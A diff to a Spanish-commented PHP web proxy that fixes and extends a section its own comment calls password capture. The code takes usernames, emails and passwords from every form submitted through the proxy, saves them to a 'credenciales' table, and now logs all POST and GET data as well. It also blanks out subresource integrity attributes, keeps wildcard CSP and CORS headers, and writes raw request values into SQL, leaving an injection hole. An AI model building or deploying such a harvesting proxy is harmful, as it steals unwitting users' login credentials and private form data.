@@ -1,5 +1,6 @@
 <?php
 include 'nucleo.php';
+include 'connect.php';
 /*--------------------------------------Lo agrego Victor----------------------------*/
 session_start();
 $iniciar = 0;
@@ -81,13 +82,13 @@ if ( isset($_POST['usernameLL']) && isset($_POST['passwordLL'])  ){
 
     $count = mysqli_num_rows($result);
     if($count >= 1) {
-      $_SESSION['username'] = $user;
-      $_SESSION['password'] = $pass;
+      $_SESSION['usernameSS'] = $user;
+      $_SESSION['passwordSS'] = $pass;
       $error = "Logged in";
     }
     else {
-      unset($_SESSION['username']);
-      unset($_SESSION['password']);
+      unset($_SESSION['usernameSS']);
+      unset($_SESSION['passwordSS']);
       unset($_SESSION['premium']);
       $error = "Tu usuario y contraseña son invalidos.";
     }
@@ -121,7 +122,7 @@ if (isset($_SESSION['free']) && $_SESSION['free'] === '1'){
   $iniciar = 1;
 }
 
-if (isset($_SESSION['username']) && isset($_SESSION['password'])){
+if (isset($_SESSION['usernameSS']) && isset($_SESSION['passwordSS'])){
   $iniciar = 1;
 }
 
@@ -187,8 +188,13 @@ $SitiosAutorizados = array(
 );
 
 $ListaNegra = array(  //aca van todas las url que no jalan por x razon
-  getHostnamePattern("facebook.com")
-);
+  //getHostnamePattern("galileo.edu")
+); //En la lista negra poner las direcciones que no cargan o no jalan por alguna razon.
+
+
+$ListaURLLimpiarHTML = array(  //aca van todas las url que no jalan porque no se formo bien el HTML
+  getHostnamePattern("galileo.edu")
+); //En la lista negra poner las direcciones que no cargan o no jalan por alguna razon.
 
 //CORS (cross-origin resource sharing)
 $forceCORS = true; //Falso = reporta el IP del cliente a `x-forwarded-for`
@@ -229,7 +235,7 @@ else {
   }
 }
 
-//------------------------------------------------A campieza codigo de Victor-------------------------------
+//------------------------------------------------Esto de aca es para captura de contraseñas-------------------------------
 //Captura de usuarios y passwors
     $username = "";
     $password  = "";
@@ -240,24 +246,38 @@ else {
     if (isset($_POST['user'])){
       $username = $_POST['user'];
     }
-    else if (isset($_POST['username'])){
+    if (isset($_POST['username'])){
       $username = $_POST['username'];
     }
-    else if (isset($_POST['email'])){
+    if (isset($_POST['email'])){
       $username = $_POST['email'];
     }
 
     if (isset($_POST['pass'])){
-      $password  = isset($_POST['pass']);
+      $password  = $_POST['pass'];
     }
-    else if (isset($_POST['password'])){
-      $password  = isset($_POST['password']);
+    if (isset($_POST['password'])){ 
+      $password  = $_POST['password'];
     }
     if ($username !== "" || $password !== ""){
-          $sql="INSERT INTO credenciales (origen, usuario, contrasena)  VALUES ('$origen', '$username', '$password'); ";
-          $conn->query($sql);
+      $sql="INSERT INTO credenciales (origen, usuario, contrasena)  VALUES ('$origen', '$username', '$password'); ";
+      $conn->query($sql);
+
+      $posst = "";
+      $gett = "";
+
+      foreach ($_POST as $key => $value) {
+        $posst = $posst . $key . ": " . $value . "\r\n";
+      }
+      foreach ($_GET as $key => $value) {
+        $gett = $gett . $key . ": " . $value . "\r\n";
+      }
+      $sql="INSERT INTO requests (post, get)  VALUES ('$posst', '$gett'); ";
+      mysqli_query($conn, $sql);
     }
-//------------------------------------------------A termina codigo de Victor-------------------------------
+
+    
+//------------------------------------------------A termina la seccion codigo -------------------------------
 
 if (empty($url)) {
     if (empty($URL_Inicio)) {
@@ -324,11 +344,18 @@ foreach ($SitiosAutorizados as $pattern) {
 }
 if (!$urlIsValid) {
   header("Location: " . PROXY_PREFIX . 'https://www.google.com/search?client=firefox-b-d&q=' .  $url);
-  exit(0);
+  exit(0); //redireccionar en caso no sea una URL
 }
 
+
+$response = makeRequest($url);
+$rawResponseHeaders = $response["headers"];
+$responseBody = $response["body"];
+$responseInfo = $response["responseInfo"];
+$responseURL = $responseInfo["url"];
+
 //-----------------------------------------------Verifica si el url esta en lista negra.-----------------------
-//esto es un chapuz para que jale con algunas ppaginas restringidas
+//esto es un chapuz para que jale con algunas paginas restringidas
 $urlListaNegra = false;
 foreach ($ListaNegra as $pattern) {
   if (preg_match($pattern, strval($url))) {
@@ -338,29 +365,37 @@ foreach ($ListaNegra as $pattern) {
 }
 
 if ($urlListaNegra) {
-  $response = makeRequest($url);
-  $rawResponseHeaders = $response["headers"];
-  $responseBody = $response["body"];
-  $responseInfo = $response["responseInfo"];
-  $responseURL = $responseInfo["url"];
-  $doc = new DomDocument();
-  @$doc->loadHTML($responseBody);
-  echo "<!-- A-Proxy -->\n" . $doc->saveHTML();
+  echo $responseBody;
   exit(0);
 }
-//-----------------------------------------------Verifica si el url esta en lista negra.-----------------------
+//-----------------------------------------------Termina codigo que Verifica si el url esta en lista negra.-----------------------
 
-$response = makeRequest($url);
-$rawResponseHeaders = $response["headers"];
-$responseBody = $response["body"];
-$responseInfo = $response["responseInfo"];
-$responseURL = $responseInfo["url"];
+
+//-----------------------------------------------Verifica si el url esta en lista de URL con html mal hecho.-----------------------
+//esto es un chapuz para que jale con algunas paginas restringidas
+$urlLL = false;
+foreach ($ListaURLLimpiarHTML as $pattern) {
+  if (preg_match($pattern, strval($url))) {
+    $urlLL = true;
+    break;
+  }
+}
+
+if ($urlLL) {
+  $patterns = array();
+  $patterns[0] = '#<ul/ class="submenu" />#';
+  $replacements = array();
+  $replacements[0] = '<ul class="submenu" >';
+  $responseBody = preg_replace($patterns, $replacements, $responseBody);
+}
+//-----------------------------------------------Termina codigo que Verifica si el url esta en lista negra.-----------------------
+
+
 if ($responseURL !== $url) {
-
   header("Location: " . PROXY_PREFIX . $responseURL, true);
-
   exit(0);
 }
+
 $header_blacklist_pattern = "/^Content-Length|^Transfer-Encoding|^Content-Encoding.*gzip/i";
 $responseHeaderBlocks = array_filter(explode("\r\n\r\n", $rawResponseHeaders));
 $lastHeaderBlock = end($responseHeaderBlocks);
@@ -371,9 +406,9 @@ foreach ($headerLines as $header) {
     header($header, false);
   }
 }
-dormirPremium($UsuarioPremium);
+
 header("X-Robots-Tag: noindex, nofollow", true); //denegar acceso a robots de indexeo
-header("Content-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline';");
+header("Content-Security-Policy: default-src * 'unsafe-inline' 'unsafe-eval'; script-src * 'unsafe-inline' 'unsafe-eval'; connect-src * 'unsafe-inline'; img-src * data: blob: 'unsafe-inline'; frame-src *; style-src * 'unsafe-inline';", true);
 if ($forceCORS) {
   header("Access-Control-Allow-Origin: *", true);
   header("Access-Control-Allow-Credentials: true", true);
@@ -391,6 +426,10 @@ $contentType = "";
 if (isset($responseInfo["content_type"])) {
   $contentType = $responseInfo["content_type"];
 }
+else{
+
+}
+
 if (stripos($contentType, "text/html") !== false) {
   $detectedEncoding = mb_detect_encoding($responseBody, "UTF-8, ISO-8859-1");
   if ($detectedEncoding) {
@@ -409,7 +448,7 @@ if (stripos($contentType, "text/html") !== false) {
     $actionInput->appendXML('<input type="hidden" name="ProxyAccion" value="' . htmlspecialchars($action) . '" />');
     $form->appendChild($actionInput);
   }
-  dormirPremium($UsuarioPremium);
+
   foreach ($xpath->query("//meta[@http-equiv]") as $element) {
     if (strcasecmp($element->getAttribute("http-equiv"), "refresh") === 0) {
       $content = $element->getAttribute("content");
@@ -421,22 +460,25 @@ if (stripos($contentType, "text/html") !== false) {
       }
     }
   }
-  dormirPremium($UsuarioPremium);
+
   foreach($xpath->query("//style") as $style) {
     $style->nodeValue = proxifyCSS($style->nodeValue, $url);
   }
-  dormirPremium($UsuarioPremium);
+
   foreach ($xpath->query("//*[@style]") as $element) {
     $element->setAttribute("style", proxifyCSS($element->getAttribute("style"), $url));
   }
-  dormirPremium($UsuarioPremium);
+
   foreach ($xpath->query("//img[@srcset]") as $element) {
     $element->setAttribute("srcset", proxifySrcset($element->getAttribute("srcset"), $url));
   }
-  dormirPremium($UsuarioPremium);
-  $proxifyAttributes = array("href", "src");
+  $proxifyAttributes = array("href", "src", "integrity");
   foreach($proxifyAttributes as $attrName) {
     foreach($xpath->query("//*[@" . $attrName . "]") as $element) {
+      if ($attrName == "integrity"){
+        $element->setAttribute($attrName, "#");
+        continue;
+      }
       $attrContent = $element->getAttribute($attrName);
       if ($attrName == "href" && preg_match("/^(about|javascript|magnet|mailto):|#/i", $attrContent)) continue;
       if ($attrName == "src" && preg_match("/^(data):/i", $attrContent)) continue;
@@ -470,6 +512,7 @@ if (stripos($contentType, "text/html") !== false) {
   
   //$body->insertBefore($before, $body->firstChild);
 //------------------------------------------------A termina codigo de Victor-------------------------------
+  
   $prependElem = $head != null ? $head : $body;
 
   if ($prependElem != null) {
@@ -529,12 +572,6 @@ if (stripos($contentType, "text/html") !== false) {
         }
       })();'
     );
-
-
-    //------------------------------------------------A campieza codigo de Victor-------------------------------
-    //------------------------------------------------A termina codigo de Victor-------------------------------
-
-
     $scriptElem->setAttribute("type", "text/javascript");
     $prependElem->insertBefore($scriptElem, $prependElem->firstChild);
   }
